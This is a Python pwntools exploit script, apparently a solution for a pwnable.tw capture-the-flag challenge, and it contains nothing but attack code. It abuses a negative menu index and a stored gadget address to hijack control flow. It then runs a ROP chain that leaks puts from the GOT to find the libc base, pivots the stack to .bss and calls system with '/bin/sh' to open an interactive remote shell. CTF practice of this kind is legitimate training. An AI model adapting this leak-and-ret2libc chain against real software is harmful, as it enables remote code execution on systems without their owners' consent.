#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'

r = remote('chall.pwnable.tw',10202)

def setName(name):
    r.recvuntil('  7. Multiplayer\n> ')
    r.sendline('6')
    r.recvuntil('  4. Toggle View\n> ')
    r.sendline('2')
    r.recvuntil('Enter your name: ')
    r.sendline(name)
    r.recvuntil('  4. Toggle View\n> ')
    r.sendline('1')

add_esp_0x1c_ret = 0x08048e48

setName(p32(add_esp_0x1c_ret))
def pop3():
    r.recvuntil('  7. Multiplayer\n> ')
    r.sendline('-33'+'a'*(5)+p32(0x804a664))
pop3()

bss = 0x8058900
pop_ebp = 0x080491bc
pop_esi_edi_ebp = 0x080491ba
leave_ret = 0x08048c58
puts_plt = 0x8048B90
puts_got = 0x805509C
read_plt = 0x8048A70

rop1 = flat(map(p32,[
    puts_plt, pop_ebp, puts_got,  # get libc_base
    read_plt, pop_esi_edi_ebp, 0, bss, 4*6+1,  # read rop2
    pop_ebp, bss-4, leave_ret
]))
r.recv(timeout=2)
r.recv(timeout=2)
r.sendline('8aaaaaaa'+rop1)
libc_puts = u32(r.recv(4))
print('[LEAK]libc_puts -> '+hex(libc_puts))

# libc6_2.23-0ubuntu10_i386
libc_base = libc_puts - 0x05fca0
libc_system = libc_base + 0x03ada0

rop2 = flat(map(p32,[
    libc_system, pop_ebp, bss+4*4,
    0xdeadbeef
]))
rop2 += '/bin/sh\x00'

r.sendline(rop2)

r.interactive()
r.close()